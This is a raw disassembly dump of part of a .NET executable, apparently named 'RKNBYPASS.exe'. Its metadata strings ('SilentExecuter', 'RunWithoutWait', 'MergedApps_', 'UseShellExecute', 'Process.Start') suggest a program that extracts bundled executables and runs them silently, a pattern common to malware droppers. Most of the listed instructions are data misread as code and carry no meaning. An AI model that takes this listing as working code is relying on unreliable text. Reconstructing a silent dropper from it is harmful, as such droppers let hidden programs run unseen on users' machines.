  4025d3:	03 b1 00 14 00 5c    	add    0x5c001400(%ecx),%esi
  4025d9:	03 b6 00 e9 00 5a    	add    0x5a00e900(%esi),%esi
  4025df:	00 13                	add    %dl,(%ebx)
  4025e1:	00 e9                	add    %ch,%cl
  4025e3:	00 89 03 e9 00 41    	add    %cl,0x4100e903(%ecx)
  4025e9:	00 96 03 ee 00 e9    	add    %dl,-0x16ff11fd(%esi)
  4025ef:	00 a7 03 e9 00 e9    	add    %ah,-0x16ff16fd(%edi)
  4025f5:	00 bc 03 f3 00 f1 00 	add    %bh,0xf100f3(%ebx,%eax,1)
  4025fc:	d8 03                	fadds  (%ebx)
  4025fe:	f8                   	clc
  4025ff:	00 09                	add    %cl,(%ecx)
  402601:	00 5a 00             	add    %bl,0x0(%edx)
  402604:	13 00                	adc    (%eax),%eax
  402606:	2e 00 0b             	add    %cl,%cs:(%ebx)
  402609:	00 06                	add    %al,(%esi)
  40260b:	01 2e                	add    %ebp,(%esi)
  40260d:	00 13                	add    %dl,(%ebx)
  40260f:	00 0f                	add    %cl,(%edi)
  402611:	01 63 00             	add    %esp,0x0(%ebx)
  402614:	83 00 5e             	addl   $0x5e,(%eax)
  402617:	00 ba 00 ff 00 37    	add    %bh,0x3700ff00(%edx)
  40261d:	00 ab 00 50 20 00    	add    %ch,0x205000(%ebx)
  402623:	00 01                	add    %al,(%ecx)
  402625:	00 04 80             	add    %al,(%eax,%eax,4)
	...
  402638:	c6 00 00             	movb   $0x0,(%eax)
  40263b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402646:	00 00                	add    %al,(%eax)
  402648:	01 00                	add    %eax,(%eax)
  40264a:	2f                   	das
  40264b:	00 00                	add    %al,(%eax)
  40264d:	00 00                	add    %al,(%eax)
  40264f:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40265a:	00 00                	add    %al,(%eax)
  40265c:	01 00                	add    %eax,(%eax)
  40265e:	38 00                	cmp    %al,(%eax)
	...
  402668:	00 3c 4d 6f 64 75 6c 	add    %bh,0x6c75646f(,%ecx,2)
  40266f:	65 3e 00 52 4b       	gs add %dl,%ds:0x4b(%edx)
  402674:	4e                   	dec    %esi
  402675:	42                   	inc    %edx
  402676:	59                   	pop    %ecx
  402677:	50                   	push   %eax
  402678:	41                   	inc    %ecx
  402679:	53                   	push   %ebx
  40267a:	53                   	push   %ebx
  40267b:	2e 65 78 65          	cs js,pn 0x4026e4
  40267f:	00 50 72             	add    %dl,0x72(%eax)
  402682:	6f                   	outsl  %ds:(%esi),(%dx)
  402683:	67 72 61             	addr16 jb 0x4026e7
  402686:	6d                   	insl   (%dx),%es:(%edi)
  402687:	00 53 69             	add    %dl,0x69(%ebx)
  40268a:	6c                   	insb   (%dx),%es:(%edi)
  40268b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40268d:	74 45                	je     0x4026d4
  40268f:	78 65                	js     0x4026f6
  402691:	63 75 74             	arpl   %esi,0x74(%ebp)
  402694:	65 72 00             	gs jb  0x402697
  402697:	6d                   	insl   (%dx),%es:(%edi)
  402698:	73 63                	jae    0x4026fd
  40269a:	6f                   	outsl  %ds:(%esi),(%dx)
  40269b:	72 6c                	jb     0x402709
  40269d:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4026a4:	65 6d                	gs insl (%dx),%es:(%edi)
  4026a6:	00 4f 62             	add    %cl,0x62(%edi)
  4026a9:	6a 65                	push   $0x65
  4026ab:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  4026af:	61                   	popa
  4026b0:	69 6e 00 52 75 6e 57 	imul   $0x576e7552,0x0(%esi),%ebp
  4026b7:	69 74 68 6f 75 74 57 	imul   $0x61577475,0x6f(%eax,%ebp,2),%esi
  4026be:	61 
  4026bf:	69 74 00 2e 63 74 6f 	imul   $0x726f7463,0x2e(%eax,%eax,1),%esi
  4026c6:	72 
  4026c7:	00 65 78             	add    %ah,0x78(%ebp)
  4026ca:	65 50                	gs push %eax
  4026cc:	61                   	popa
  4026cd:	74 68                	je     0x402737
  4026cf:	00 53 79             	add    %dl,0x79(%ebx)
  4026d2:	73 74                	jae    0x402748
  4026d4:	65 6d                	gs insl (%dx),%es:(%edi)
  4026d6:	2e 52                	cs push %edx
  4026d8:	75 6e                	jne    0x402748
  4026da:	74 69                	je     0x402745
  4026dc:	6d                   	insl   (%dx),%es:(%edi)
  4026dd:	65 2e 43             	gs cs inc %ebx
  4026e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4026e1:	6d                   	insl   (%dx),%es:(%edi)
  4026e2:	70 69                	jo     0x40274d
  4026e4:	6c                   	insb   (%dx),%es:(%edi)
  4026e5:	65 72 53             	gs jb  0x40273b
  4026e8:	65 72 76             	gs jb  0x402761
  4026eb:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  4026f2:	6d                   	insl   (%dx),%es:(%edi)
  4026f3:	70 69                	jo     0x40275e
  4026f5:	6c                   	insb   (%dx),%es:(%edi)
  4026f6:	61                   	popa
  4026f7:	74 69                	je     0x402762
  4026f9:	6f                   	outsl  %ds:(%esi),(%dx)
  4026fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4026fb:	52                   	push   %edx
  4026fc:	65 6c                	gs insb (%dx),%es:(%edi)
  4026fe:	61                   	popa
  4026ff:	78 61                	js     0x402762
  402701:	74 69                	je     0x40276c
  402703:	6f                   	outsl  %ds:(%esi),(%dx)
  402704:	6e                   	outsb  %ds:(%esi),(%dx)
  402705:	73 41                	jae    0x402748
  402707:	74 74                	je     0x40277d
  402709:	72 69                	jb     0x402774
  40270b:	62 75 74             	bound  %esi,0x74(%ebp)
  40270e:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402712:	6e                   	outsb  %ds:(%esi),(%dx)
  402713:	74 69                	je     0x40277e
  402715:	6d                   	insl   (%dx),%es:(%edi)
  402716:	65 43                	gs inc %ebx
  402718:	6f                   	outsl  %ds:(%esi),(%dx)
  402719:	6d                   	insl   (%dx),%es:(%edi)
  40271a:	70 61                	jo     0x40277d
  40271c:	74 69                	je     0x402787
  40271e:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402721:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  402728:	69 
  402729:	62 75 74             	bound  %esi,0x74(%ebp)
  40272c:	65 00 52 4b          	add    %dl,%gs:0x4b(%edx)
  402730:	4e                   	dec    %esi
  402731:	42                   	inc    %edx
  402732:	59                   	pop    %ecx
  402733:	50                   	push   %eax
  402734:	41                   	inc    %ecx
  402735:	53                   	push   %ebx
  402736:	53                   	push   %ebx
  402737:	00 45 6e             	add    %al,0x6e(%ebp)
  40273a:	76 69                	jbe    0x4027a5
  40273c:	72 6f                	jb     0x4027ad
  40273e:	6e                   	outsb  %ds:(%esi),(%dx)
  40273f:	6d                   	insl   (%dx),%es:(%edi)
  402740:	65 6e                	outsb  %gs:(%esi),(%dx)
  402742:	74 00                	je     0x402744
  402744:	53                   	push   %ebx
  402745:	70 65                	jo     0x4027ac
  402747:	63 69 61             	arpl   %ebp,0x61(%ecx)
  40274a:	6c                   	insb   (%dx),%es:(%edi)
  40274b:	46                   	inc    %esi
  40274c:	6f                   	outsl  %ds:(%esi),(%dx)
  40274d:	6c                   	insb   (%dx),%es:(%edi)
  40274e:	64 65 72 00          	fs gs jb 0x402752
  402752:	47                   	inc    %edi
  402753:	65 74 46             	gs je  0x40279c
  402756:	6f                   	outsl  %ds:(%esi),(%dx)
  402757:	6c                   	insb   (%dx),%es:(%edi)
  402758:	64 65 72 50          	fs gs jb 0x4027ac
  40275c:	61                   	popa
  40275d:	74 68                	je     0x4027c7
  40275f:	00 47 75             	add    %al,0x75(%edi)
  402762:	69 64 00 4e 65 77 47 	imul   $0x75477765,0x4e(%eax,%eax,1),%esp
  402769:	75 
  40276a:	69 64 00 54 6f 53 74 	imul   $0x7274536f,0x54(%eax,%eax,1),%esp
  402771:	72 
  402772:	69 6e 67 00 53 74 72 	imul   $0x72745300,0x67(%esi),%ebp
  402779:	69 6e 67 00 43 6f 6e 	imul   $0x6e6f4300,0x67(%esi),%ebp
  402780:	63 61 74             	arpl   %esp,0x74(%ecx)
  402783:	00 53 79             	add    %dl,0x79(%ebx)
  402786:	73 74                	jae    0x4027fc
  402788:	65 6d                	gs insl (%dx),%es:(%edi)
  40278a:	2e 49                	cs dec %ecx
  40278c:	4f                   	dec    %edi
  40278d:	00 50 61             	add    %dl,0x61(%eax)
  402790:	74 68                	je     0x4027fa
  402792:	00 43 6f             	add    %al,0x6f(%ebx)
  402795:	6d                   	insl   (%dx),%es:(%edi)
  402796:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  402799:	65 00 44 69 72       	add    %al,%gs:0x72(%ecx,%ebp,2)
  40279e:	65 63 74 6f 72       	arpl   %esi,%gs:0x72(%edi,%ebp,2)
  4027a3:	79 00                	jns    0x4027a5
  4027a5:	44                   	inc    %esp
  4027a6:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4027ad:	79 49                	jns    0x4027f8
  4027af:	6e                   	outsb  %ds:(%esi),(%dx)
  4027b0:	66 6f                	outsw  %ds:(%esi),(%dx)
  4027b2:	00 43 72             	add    %al,0x72(%ebx)
  4027b5:	65 61                	gs popa
  4027b7:	74 65                	je     0x40281e
  4027b9:	44                   	inc    %esp
  4027ba:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  4027c1:	79 00                	jns    0x4027c3
  4027c3:	53                   	push   %ebx
  4027c4:	79 73                	jns    0x402839
  4027c6:	74 65                	je     0x40282d
  4027c8:	6d                   	insl   (%dx),%es:(%edi)
  4027c9:	2e 43                	cs inc %ebx
  4027cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4027cc:	6c                   	insb   (%dx),%es:(%edi)
  4027cd:	6c                   	insb   (%dx),%es:(%edi)
  4027ce:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4027d3:	6e                   	outsb  %ds:(%esi),(%dx)
  4027d4:	73 2e                	jae    0x402804
  4027d6:	47                   	inc    %edi
  4027d7:	65 6e                	outsb  %gs:(%esi),(%dx)
  4027d9:	65 72 69             	gs jb  0x402845
  4027dc:	63 00                	arpl   %eax,(%eax)
  4027de:	4c                   	dec    %esp
  4027df:	69 73 74 60 31 00 53 	imul   $0x53003160,0x74(%ebx),%esi
  4027e6:	79 73                	jns    0x40285b
  4027e8:	74 65                	je     0x40284f
  4027ea:	6d                   	insl   (%dx),%es:(%edi)
  4027eb:	2e 52                	cs push %edx
  4027ed:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  4027f0:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4027f5:	6e                   	outsb  %ds:(%esi),(%dx)
  4027f6:	00 41 73             	add    %al,0x73(%ecx)
  4027f9:	73 65                	jae    0x402860
  4027fb:	6d                   	insl   (%dx),%es:(%edi)
  4027fc:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402800:	47                   	inc    %edi
  402801:	65 74 45             	gs je  0x402849
  402804:	78 65                	js     0x40286b
  402806:	63 75 74             	arpl   %esi,0x74(%ebp)
  402809:	69 6e 67 41 73 73 65 	imul   $0x65737341,0x67(%esi),%ebp
  402810:	6d                   	insl   (%dx),%es:(%edi)
  402811:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  402815:	67 65 74 5f          	addr16 gs je 0x402878
  402819:	4c                   	dec    %esp
  40281a:	6f                   	outsl  %ds:(%esi),(%dx)
  40281b:	63 61 74             	arpl   %esp,0x74(%ecx)
  40281e:	69 6f 6e 00 46 69 6c 	imul   $0x6c694600,0x6e(%edi),%ebp
  402825:	65 53                	gs push %ebx
  402827:	74 72                	je     0x40289b
  402829:	65 61                	gs popa
  40282b:	6d                   	insl   (%dx),%es:(%edi)
  40282c:	00 46 69             	add    %al,0x69(%esi)
  40282f:	6c                   	insb   (%dx),%es:(%edi)
  402830:	65 4d                	gs dec %ebp
  402832:	6f                   	outsl  %ds:(%esi),(%dx)
  402833:	64 65 00 46 69       	fs add %al,%gs:0x69(%esi)
  402838:	6c                   	insb   (%dx),%es:(%edi)
  402839:	65 41                	gs inc %ecx
  40283b:	63 63 65             	arpl   %esp,0x65(%ebx)
  40283e:	73 73                	jae    0x4028b3
  402840:	00 53 74             	add    %dl,0x74(%ebx)
  402843:	72 65                	jb     0x4028aa
  402845:	61                   	popa
  402846:	6d                   	insl   (%dx),%es:(%edi)
  402847:	00 67 65             	add    %ah,0x65(%edi)
  40284a:	74 5f                	je     0x4028ab
  40284c:	4c                   	dec    %esp
  40284d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40284f:	67 74 68             	addr16 je 0x4028ba
  402852:	00 53 65             	add    %dl,0x65(%ebx)
  402855:	65 6b 4f 72 69       	imul   $0x69,%gs:0x72(%edi),%ecx
  40285a:	67 69 6e 00 53 65 65 	imul   $0x6b656553,0x0(%bp),%ebp
  402861:	6b 
  402862:	00 42 79             	add    %al,0x79(%edx)
  402865:	74 65                	je     0x4028cc
  402867:	00 52 65             	add    %dl,0x65(%edx)
  40286a:	61                   	popa
  40286b:	64 00 3c 50          	add    %bh,%fs:(%eax,%edx,2)
  40286f:	72 69                	jb     0x4028da
  402871:	76 61                	jbe    0x4028d4
  402873:	74 65                	je     0x4028da
  402875:	49                   	dec    %ecx
  402876:	6d                   	insl   (%dx),%es:(%edi)
  402877:	70 6c                	jo     0x4028e5
  402879:	65 6d                	gs insl (%dx),%es:(%edi)
  40287b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40287d:	74 61                	je     0x4028e0
  40287f:	74 69                	je     0x4028ea
  402881:	6f                   	outsl  %ds:(%esi),(%dx)
  402882:	6e                   	outsb  %ds:(%esi),(%dx)
  402883:	44                   	inc    %esp
  402884:	65 74 61             	gs je  0x4028e8
  402887:	69 6c 73 3e 7b 42 30 	imul   $0x3530427b,0x3e(%ebx,%esi,2),%ebp
  40288e:	35 
  40288f:	44                   	inc    %esp
  402890:	32 37                	xor    (%edi),%dh
  402892:	42                   	inc    %edx
  402893:	31 2d 45 33 36 44    	xor    %ebp,0x44363345
  402899:	2d 34 46 36 43       	sub    $0x43364634,%eax
  40289e:	2d 41 37 35 45       	sub    $0x45353741,%eax
  4028a3:	2d 41 41 39 32       	sub    $0x32394141,%eax
  4028a8:	41                   	inc    %ecx
  4028a9:	34 37                	xor    $0x37,%al
  4028ab:	41                   	inc    %ecx
  4028ac:	38 43 35             	cmp    %al,0x35(%ebx)
  4028af:	34 7d                	xor    $0x7d,%al
  4028b1:	00 43 6f             	add    %al,0x6f(%ebx)
  4028b4:	6d                   	insl   (%dx),%es:(%edi)
  4028b5:	70 69                	jo     0x402920
  4028b7:	6c                   	insb   (%dx),%es:(%edi)
  4028b8:	65 72 47             	gs jb  0x402902
  4028bb:	65 6e                	outsb  %gs:(%esi),(%dx)
  4028bd:	65 72 61             	gs jb  0x402921
  4028c0:	74 65                	je     0x402927
  4028c2:	64 41                	fs inc %ecx
  4028c4:	74 74                	je     0x40293a
  4028c6:	72 69                	jb     0x402931
  4028c8:	62 75 74             	bound  %esi,0x74(%ebp)
  4028cb:	65 00 24 24          	add    %ah,%gs:(%esp)
  4028cf:	6d                   	insl   (%dx),%es:(%edi)
  4028d0:	65 74 68             	gs je  0x40293b
  4028d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4028d4:	64 30 78 36          	xor    %bh,%fs:0x36(%eax)
  4028d8:	30 30                	xor    %dh,(%eax)
  4028da:	30 30                	xor    %dh,(%eax)
  4028dc:	30 31                	xor    %dh,(%ecx)
  4028de:	2d 31 00 52 75       	sub    $0x75520031,%eax
  4028e3:	6e                   	outsb  %ds:(%esi),(%dx)
  4028e4:	74 69                	je     0x40294f
  4028e6:	6d                   	insl   (%dx),%es:(%edi)
  4028e7:	65 48                	gs dec %eax
  4028e9:	65 6c                	gs insb (%dx),%es:(%edi)
  4028eb:	70 65                	jo     0x402952
  4028ed:	72 73                	jb     0x402962
  4028ef:	00 41 72             	add    %al,0x72(%ecx)
  4028f2:	72 61                	jb     0x402955
  4028f4:	79 00                	jns    0x4028f6
  4028f6:	52                   	push   %edx
  4028f7:	75 6e                	jne    0x402967
  4028f9:	74 69                	je     0x402964
  4028fb:	6d                   	insl   (%dx),%es:(%edi)
  4028fc:	65 46                	gs inc %esi
  4028fe:	69 65 6c 64 48 61 6e 	imul   $0x6e614864,0x6c(%ebp),%esp
  402905:	64 6c                	fs insb (%dx),%es:(%edi)
  402907:	65 00 49 6e          	add    %cl,%gs:0x6e(%ecx)
  40290b:	69 74 69 61 6c 69 7a 	imul   $0x657a696c,0x61(%ecx,%ebp,2),%esi
  402912:	65 
  402913:	41                   	inc    %ecx
  402914:	72 72                	jb     0x402988
  402916:	61                   	popa
  402917:	79 00                	jns    0x402919
  402919:	42                   	inc    %edx
  40291a:	69 74 43 6f 6e 76 65 	imul   $0x7265766e,0x6f(%ebx,%eax,2),%esi
  402921:	72 
  402922:	74 65                	je     0x402989
  402924:	72 00                	jb     0x402926
  402926:	54                   	push   %esp
  402927:	6f                   	outsl  %ds:(%esi),(%dx)
  402928:	49                   	dec    %ecx
  402929:	6e                   	outsb  %ds:(%esi),(%dx)
  40292a:	74 36                	je     0x402962
  40292c:	34 00                	xor    $0x0,%al
  40292e:	54                   	push   %esp
  40292f:	6f                   	outsl  %ds:(%esi),(%dx)
  402930:	49                   	dec    %ecx
  402931:	6e                   	outsb  %ds:(%esi),(%dx)
  402932:	74 33                	je     0x402967
  402934:	32 00                	xor    (%eax),%al
  402936:	53                   	push   %ebx
  402937:	79 73                	jns    0x4029ac
  402939:	74 65                	je     0x4029a0
  40293b:	6d                   	insl   (%dx),%es:(%edi)
  40293c:	2e 54                	cs push %esp
  40293e:	65 78 74             	gs js  0x4029b5
  402941:	00 45 6e             	add    %al,0x6e(%ebp)
  402944:	63 6f 64             	arpl   %ebp,0x64(%edi)
  402947:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  40294e:	5f                   	pop    %edi
  40294f:	55                   	push   %ebp
  402950:	54                   	push   %esp
  402951:	46                   	inc    %esi
  402952:	38 00                	cmp    %al,(%eax)
  402954:	47                   	inc    %edi
  402955:	65 74 53             	gs je  0x4029ab
  402958:	74 72                	je     0x4029cc
  40295a:	69 6e 67 00 4d 61 74 	imul   $0x74614d00,0x67(%esi),%ebp
  402961:	68 00 4d 69 6e       	push   $0x6e694d00
  402966:	00 57 72             	add    %dl,0x72(%edi)
  402969:	69 74 65 00 49 44 69 	imul   $0x73694449,0x0(%ebp,%eiz,2),%esi
  402970:	73 
  402971:	70 6f                	jo     0x4029e2
  402973:	73 61                	jae    0x4029d6
  402975:	62 6c 65 00          	bound  %ebp,0x0(%ebp,%eiz,2)
  402979:	44                   	inc    %esp
  40297a:	69 73 70 6f 73 65 00 	imul   $0x65736f,0x70(%ebx),%esi
  402981:	53                   	push   %ebx
  402982:	74 72                	je     0x4029f6
  402984:	69 6e 67 43 6f 6d 70 	imul   $0x706d6f43,0x67(%esi),%ebp
  40298b:	61                   	popa
  40298c:	72 69                	jb     0x4029f7
  40298e:	73 6f                	jae    0x4029ff
  402990:	6e                   	outsb  %ds:(%esi),(%dx)
  402991:	00 45 6e             	add    %al,0x6e(%ebp)
  402994:	64 73 57             	fs jae 0x4029ee
  402997:	69 74 68 00 41 64 64 	imul   $0x646441,0x0(%eax,%ebp,2),%esi
  40299e:	00 
  40299f:	45                   	inc    %ebp
  4029a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4029a1:	75 6d                	jne    0x402a10
  4029a3:	65 72 61             	gs jb  0x402a07
  4029a6:	74 6f                	je     0x402a17
  4029a8:	72 00                	jb     0x4029aa
  4029aa:	47                   	inc    %edi
  4029ab:	65 74 45             	gs je  0x4029f3
  4029ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4029af:	75 6d                	jne    0x402a1e
  4029b1:	65 72 61             	gs jb  0x402a15
  4029b4:	74 6f                	je     0x402a25
  4029b6:	72 00                	jb     0x4029b8
  4029b8:	67 65 74 5f          	addr16 gs je 0x402a1b
  4029bc:	43                   	inc    %ebx
  4029bd:	75 72                	jne    0x402a31
  4029bf:	72 65                	jb     0x402a26
  4029c1:	6e                   	outsb  %ds:(%esi),(%dx)
  4029c2:	74 00                	je     0x4029c4
  4029c4:	4d                   	dec    %ebp
  4029c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4029c6:	76 65                	jbe    0x402a2d
  4029c8:	4e                   	dec    %esi
  4029c9:	65 78 74             	gs js  0x402a40
  4029cc:	00 53 79             	add    %dl,0x79(%ebx)
  4029cf:	73 74                	jae    0x402a45
  4029d1:	65 6d                	gs insl (%dx),%es:(%edi)
  4029d3:	2e 44                	cs inc %esp
  4029d5:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  4029dc:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  4029e3:	63 65 73             	arpl   %esp,0x73(%ebp)
  4029e6:	73 53                	jae    0x402a3b
  4029e8:	74 61                	je     0x402a4b
  4029ea:	72 74                	jb     0x402a60
  4029ec:	49                   	dec    %ecx
  4029ed:	6e                   	outsb  %ds:(%esi),(%dx)
  4029ee:	66 6f                	outsw  %ds:(%esi),(%dx)
  4029f0:	00 73 65             	add    %dh,0x65(%ebx)
  4029f3:	74 5f                	je     0x402a54
  4029f5:	46                   	inc    %esi
  4029f6:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  4029fd:	00 
  4029fe:	47                   	inc    %edi
  4029ff:	65 74 44             	gs je  0x402a46
  402a02:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  402a09:	79 4e                	jns    0x402a59
  402a0b:	61                   	popa
  402a0c:	6d                   	insl   (%dx),%es:(%edi)
  402a0d:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  402a11:	74 5f                	je     0x402a72
  402a13:	57                   	push   %edi
  402a14:	6f                   	outsl  %ds:(%esi),(%dx)
  402a15:	72 6b                	jb     0x402a82
  402a17:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%esi),%ebp
  402a1e:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  402a22:	79 00                	jns    0x402a24
  402a24:	73 65                	jae    0x402a8b
  402a26:	74 5f                	je     0x402a87
  402a28:	55                   	push   %ebp
  402a29:	73 65                	jae    0x402a90
  402a2b:	53                   	push   %ebx
  402a2c:	68 65 6c 6c 45       	push   $0x456c6c65
  402a31:	78 65                	js     0x402a98
  402a33:	63 75 74             	arpl   %esi,0x74(%ebp)
  402a36:	65 00 50 72          	add    %dl,%gs:0x72(%eax)
  402a3a:	6f                   	outsl  %ds:(%esi),(%dx)
  402a3b:	63 65 73             	arpl   %esp,0x73(%ebp)
  402a3e:	73 00                	jae    0x402a40
  402a40:	53                   	push   %ebx
  402a41:	74 61                	je     0x402aa4
  402a43:	72 74                	jb     0x402ab9
  402a45:	00 00                	add    %al,(%eax)
  402a47:	00 00                	add    %al,(%eax)
  402a49:	17                   	pop    %ss
  402a4a:	4d                   	dec    %ebp
  402a4b:	00 65 00             	add    %ah,0x0(%ebp)
  402a4e:	72 00                	jb     0x402a50
  402a50:	67 00 65 00          	add    %ah,0x0(%di)
  402a54:	64 00 41 00          	add    %al,%fs:0x0(%ecx)
  402a58:	70 00                	jo     0x402a5a
  402a5a:	70 00                	jo     0x402a5c
  402a5c:	73 00                	jae    0x402a5e
  402a5e:	5f                   	pop    %edi
  402a5f:	00 00                	add    %al,(%eax)
  402a61:	09 2e                	or     %ebp,(%esi)
  402a63:	00 65 00             	add    %ah,0x0(%ebp)
  402a66:	78 00                	js     0x402a68
  402a68:	65 00 00             	add    %al,%gs:(%eax)
  402a6b:	00 b1 27 5d b0 6d    	add    %dh,0x6db05d27(%ecx)
  402a71:	e3 6c                	jecxz  0x402adf
  402a73:	4f                   	dec    %edi
  402a74:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  402a75:	5e                   	pop    %esi
  402a76:	aa                   	stos   %al,%es:(%edi)
  402a77:	92                   	xchg   %eax,%edx
  402a78:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402a79:	7a 8c                	jp     0x402a07
  402a7b:	54                   	push   %esp
  402a7c:	00 08                	add    %cl,(%eax)
  402a7e:	b7 7a                	mov    $0x7a,%bh
  402a80:	5c                   	pop    %esp
  402a81:	56                   	push   %esi
  402a82:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  402a85:	89 03                	mov    %eax,(%ebx)
  402a87:	00 00                	add    %al,(%eax)
  402a89:	01 04 00             	add    %eax,(%eax,%eax,1)
  402a8c:	01 01                	add    %eax,(%ecx)
  402a8e:	0e                   	push   %cs
  402a8f:	03 20                	add    (%eax),%esp
  402a91:	00 01                	add    %al,(%ecx)
  402a93:	04 20                	add    $0x20,%al
  402a95:	01 01                	add    %eax,(%ecx)
  402a97:	08 05 00 01 0e 11    	or     %al,0x110e0100
  402a9d:	15 04 00 00 11       	adc    $0x11000004,%eax
  402aa2:	19 03                	sbb    %eax,(%ebx)
  402aa4:	20 00                	and    %al,(%eax)
  402aa6:	0e                   	push   %cs
  402aa7:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402aac:	0e                   	push   %cs
  402aad:	05 00 01 12 29       	add    $0x29120100,%eax
  402ab2:	0e                   	push   %cs
  402ab3:	05 15 12 2d 01       	add    $0x12d1215,%eax
  402ab8:	0e                   	push   %cs
  402ab9:	04 00                	add    $0x0,%al
  402abb:	00 12                	add    %dl,(%edx)
  402abd:	31 08                	xor    %ecx,(%eax)
  402abf:	20 03                	and    %al,(%ebx)
  402ac1:	01 0e                	add    %ecx,(%esi)
  402ac3:	11 39                	adc    %edi,(%ecx)
  402ac5:	11 3d 03 20 00 0a    	adc    %edi,0xa002003
  402acb:	06                   	push   %es
  402acc:	20 02                	and    %al,(%edx)
  402ace:	0a 0a                	or     (%edx),%cl
  402ad0:	11 45 07             	adc    %eax,0x7(%ebp)
  402ad3:	20 03                	and    %al,(%ebx)
  402ad5:	08 1d 05 08 08 04    	or     %bl,0x4080805
  402adb:	01 00                	add    %eax,(%eax)
  402add:	00 00                	add    %al,(%eax)
  402adf:	02 06                	add    (%esi),%al
  402ae1:	08 07                	or     %al,(%edi)
  402ae3:	00 02                	add    %al,(%edx)
  402ae5:	01 12                	add    %edx,(%edx)
  402ae7:	55                   	push   %ebp
  402ae8:	11 59 06             	adc    %ebx,0x6(%ecx)
  402aeb:	00 02                	add    %al,(%edx)
  402aed:	0a 1d 05 08 06 00    	or     0x60805,%bl
  402af3:	02 08                	add    (%eax),%cl
  402af5:	1d 05 08 04 00       	sbb    $0x40805,%eax
  402afa:	00 12                	add    %dl,(%edx)
  402afc:	61                   	popa
  402afd:	05 20 01 0e 1d       	add    $0x1d0e0120,%eax
  402b02:	05 05 00 02 0a       	add    $0xa020005,%eax
  402b07:	0a 0a                	or     (%edx),%cl
  402b09:	07                   	pop    %es
  402b0a:	20 03                	and    %al,(%ebx)
  402b0c:	01 1d 05 08 08 06    	add    %ebx,0x6080805
  402b12:	20 02                	and    %al,(%edx)
  402b14:	02 0e                	add    (%esi),%cl
  402b16:	11 6d 05             	adc    %ebp,0x5(%ebp)
  402b19:	20 01                	and    %al,(%ecx)
  402b1b:	01 13                	add    %edx,(%ebx)
  402b1d:	00 08                	add    %cl,(%eax)
  402b1f:	20 00                	and    %al,(%eax)
  402b21:	15 11 71 01 13       	adc    $0x13017111,%eax
  402b26:	00 05 15 11 71 01    	add    %al,0x1711115
  402b2c:	0e                   	push   %cs
  402b2d:	04 20                	add    $0x20,%al
  402b2f:	00 13                	add    %dl,(%ebx)
  402b31:	00 03                	add    %al,(%ebx)
  402b33:	20 00                	and    %al,(%eax)
  402b35:	02 2e                	add    (%esi),%ch
  402b37:	07                   	pop    %es
  402b38:	1b 0e                	sbb    (%esi),%ecx
  402b3a:	15 12 2d 01 0e       	adc    $0xe012d12,%eax
  402b3f:	0e                   	push   %cs
  402b40:	12 35 0a 1d 05 1d    	adc    0x1d051d0a,%dh
  402b46:	05 02 08 0a 08       	add    $0x80a0802,%eax
  402b4b:	08 1d 05 08 1d 05    	or     %bl,0x51d0805
  402b51:	0e                   	push   %cs
  402b52:	1d 05 0a 0e 12       	sbb    $0x120e0a05,%eax
  402b57:	35 1d 05 0a 08       	xor    $0x80a051d,%eax
  402b5c:	08 0e                	or     %cl,(%esi)
  402b5e:	11 19                	adc    %ebx,(%ecx)
  402b60:	15 11 71 01 0e       	adc    $0xe017111,%eax
  402b65:	04 20                	add    $0x20,%al
  402b67:	01 01                	add    %eax,(%ecx)
  402b69:	0e                   	push   %cs
  402b6a:	04 00                	add    $0x0,%al
  402b6c:	01 0e                	add    %ecx,(%esi)
  402b6e:	0e                   	push   %cs
  402b6f:	04 20                	add    $0x20,%al
  402b71:	01 01                	add    %eax,(%ecx)
  402b73:	02 06                	add    (%esi),%al
  402b75:	00 01                	add    %al,(%ecx)
  402b77:	12 79 12             	adc    0x12(%ecx),%bh
  402b7a:	75 06                	jne    0x402b82
  402b7c:	07                   	pop    %es
  402b7d:	02 12                	add    (%edx),%dl
  402b7f:	75 12                	jne    0x402b93
  402b81:	75 08                	jne    0x402b8b
  402b83:	01 00                	add    %eax,(%eax)
  402b85:	08 00                	or     %al,(%eax)
  402b87:	00 00                	add    %al,(%eax)
  402b89:	00 00                	add    %al,(%eax)
  402b8b:	1e                   	push   %ds
